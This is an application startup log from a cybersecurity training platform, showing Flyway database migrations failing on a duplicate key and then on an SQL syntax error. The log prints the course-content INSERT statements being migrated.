2026-03-12 00:23:14.331 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:23:14.341 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:23:14.470 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:23:14.612 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:23:14.612 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:23:14.612 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:23:14.846 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:23:14.902 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 4 migrations (execution time 00:00.039s)
2026-03-12 00:23:14.961 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 2
2026-03-12 00:23:14.997 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:23:15.015 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "3 - Additional Learning Paths" failed! Changes successfully rolled back.
2026-03-12 00:23:15.027 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:23:15.034 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:23:15.051 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23505
Error Code : 0
Message    : ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 9
Statement  : -- CyberSkill Platform - Additional Learning Paths
-- Version: 1.1.0
-- Description: Adds 3 new cutting-edge learning paths with comprehensive modules, sections, and lessons

-- ============================================================================
-- LEARNING PATH 5: THREAT INTELLIGENCE & HUNTING
-- ============================================================================

INSERT INTO learning_paths (name, slug, description, icon, order_index, estimated_hours)
VALUES (
    'Threat Intelligence & Hunting',
    'threat-intelligence-hunting',
    'Master threat intelligence analysis, threat hunting techniques, and proactive defense strategies. Learn to identify, track, and neutralize advanced threats.',
    'crosshair',
    5,
    40
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: duplicate key value violates unique constraint "learning_paths_slug_key"
  Detail: Key (slug)=(threat-intelligence-hunting) already exists.
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:24:45.950 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:24:45.953 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:24:46.048 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:24:46.154 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:24:46.154 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:24:46.155 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:24:46.313 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:24:46.342 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:24:46.345 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.018s)
2026-03-12 00:24:46.390 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" with baseline ...
2026-03-12 00:24:46.487 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbBaseline - Successfully baselined schema with version: 0
2026-03-12 00:24:46.547 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 0
2026-03-12 00:24:46.572 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:24:46.583 [vert.x-eventloop-thread-1] WARN  o.f.c.i.s.DefaultSqlScriptExecutor - DB: extension "uuid-ossp" already exists, skipping (SQL State: 42710 - Error Code: 0)
2026-03-12 00:24:47.039 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:24:47.082 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:24:47.099 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "3 - Additional Learning Paths" failed! Changes successfully rolled back.
2026-03-12 00:24:47.105 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
